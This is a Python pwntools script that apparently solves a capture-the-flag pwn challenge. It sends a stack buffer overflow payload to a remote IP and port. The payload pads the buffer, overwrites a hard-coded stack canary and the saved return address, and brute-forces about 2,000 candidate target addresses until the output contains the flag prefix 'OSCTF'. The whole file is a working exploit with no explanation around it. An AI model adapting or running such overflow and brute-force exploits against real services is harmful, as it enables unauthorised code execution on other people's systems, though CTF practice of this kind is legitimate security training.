```python 
#!/usr/bin/env python3

from pwn import *
import time

context.binary = elf = ELF('./challenge')
context.terminal = ['xfce4-terminal', '-e']
context.log_level = 'info'

offset = 32
offset_rip = 16

canary = b"NECGLSPQ"
initial_ret = 0x8049054
base_twt = 0x8048000

def fml(twt, output_file):
    p = remote('34.125.199.248', 5674)
    # p = process(elf.path) # 
    # canary = b"AAAAAAAA"

    p.sendline(b"1000")

    payload  = b"A" * offset
    payload += canary
    payload += b"B" * offset_rip
    payload += p32(initial_ret) # ;; idt this is actl required, can remove if u don't care about stack alignment
    payload += p32(twt)

    p.sendline(payload)

    try:
        out = p.recvall(timeout=1)
        output_file.write(f"trying: {hex(twt)}\n".encode())
        output_file.write(out + b"\n")
        output_file.flush()
        print(out)
        if b"OSCTF" in out:
            print(f"ok, found twt: {hex(twt)}")
            output_file.write(f"Found twt address: {hex(twt)}\n".encode())
            output_file.write(out + b"\n")
            output_file.flush()
            exit(0)
    except Exception as e:
        output_file.write(f"err: {e}\n".encode())
        output_file.flush()
        print(f"err: {e}")

    p.close()

start_addr = base_twt - 1000
end_addr   = base_twt + 1000

with open("out.txt", "wb") as output_file:
    for twt in range(start_addr, end_addr + 1):
        print(f"twt addr: {hex(twt)}")
        try:
            fml(twt, output_file)
        except Exception as e:
            output_file.write(f"err: {e}\n".encode())
            output_file.flush()
            print(f"err: {e}")
```
